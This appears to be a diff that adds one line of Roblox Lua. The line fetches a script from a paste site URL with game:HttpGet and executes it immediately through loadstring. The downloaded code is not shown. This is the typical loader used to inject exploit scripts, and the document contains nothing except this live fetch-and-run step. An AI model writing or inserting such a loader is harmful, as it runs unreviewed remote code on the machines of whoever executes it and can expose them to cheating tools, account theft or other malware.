@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://freenote.biz/raw/HtEw5G3dv4"))();
